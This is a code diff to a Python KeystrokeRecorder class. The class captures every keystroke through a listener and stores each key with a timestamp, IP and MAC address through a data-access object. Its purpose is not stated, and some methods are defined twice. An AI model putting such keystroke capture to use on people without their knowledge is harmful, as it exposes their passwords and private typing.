@@ -21,23 +21,21 @@ class KeystrokeRecorder(Recorder):
         except AttributeError:
             self.save_keystroke(str(key)[4:])
 
-    def save_keystroke(self, key):
-        time = super().get_timestemp()
-        ip = super().get_ip()
-        mac = super().get_mac()
-        self.keystroke_collection.create(Keystroke(key, time, ip, mac, []))
-
     def stop(self):
-        self.listener.stop()
+        try:
+            self.listener.stop()
         except Exception as e:
             raise e
 
     def save_keystroke(self, key):
-        Keystroke(timestamp=super().get_timestamp(), ip_address=self.ip,
-                  mac_address=self.mac, annotation=Annotation(self.ip, None), key=str(key.char))
+        self.ksDAO.create(Keystroke(timestamp=super().get_timestamp(), ip_address=self.ip,
+                                    mac_address=self.mac, annotations=Annotation(self.ip, None), key=str(key.char)))
 
     def stop(self):
         self.listener.stop()
 
     def start(self):
         self.listener.start()
+
+
+recorder = KeystrokeRecorder()
